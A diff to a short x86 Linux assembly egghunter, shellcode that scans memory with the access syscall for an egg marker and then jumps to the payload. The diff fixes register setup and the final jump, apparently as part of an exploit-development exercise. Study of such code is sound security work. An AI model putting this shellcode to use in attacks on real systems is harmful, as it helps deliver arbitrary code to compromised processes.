@@ -9,15 +9,16 @@ global _start
 section .text
 _start:
 
-init:
+
 	; Clearing all the registers that will be used and moving the egghunter key to ebx. 
 	; Note this value is 1 larger than the required key and then decremented afterwards.
 	; This is to stop the egghunter thinking thinking that this may be the key to find.
 	
-	xor ecx, ecx 		; value to be empty for syscall
-	mul ecx      		; eax nulled
-	mov ebx, 0x50905091     ; key to find + 1
-	dec ebx      		; dec edx to = the key
+xor ecx, ecx			; value to be empty for syscall
+xor edx, edx
+mul ecx				; eax nulled
+mov ebx, 0x50905091     	; key to find + 1
+dec ebx 			; dec edx to = the key
 
 
 addr_page:
@@ -28,7 +29,7 @@ incr:
 	inc edx			; increment edx to push it from 0xfff to 0x1000 - it will add 0x1000 each call
 	pusha        		; Push all general purpose registers to the stackto maintain state after syscall
 
-
+lea ebx, [edx+0x4]		; loading the address of edx+0x4 to ebx for the addr parameter
 mov al, 0x21 			; access(2) syscall value
 int 0x80     			; Interupt for syscall
 
@@ -46,4 +47,4 @@ cmp [edx+0x4], ebx 		; Compare the contents of ebx+0x4 to edx, the key
 jnz short incr	 		; If the values do not match a jump is taken to addr_inc
 
 
-jmp ebx      			; unconditional jump to edx, the confirmed location to continue execution
+jmp edx      			; unconditional jump to edx, the confirmed location to continue execution
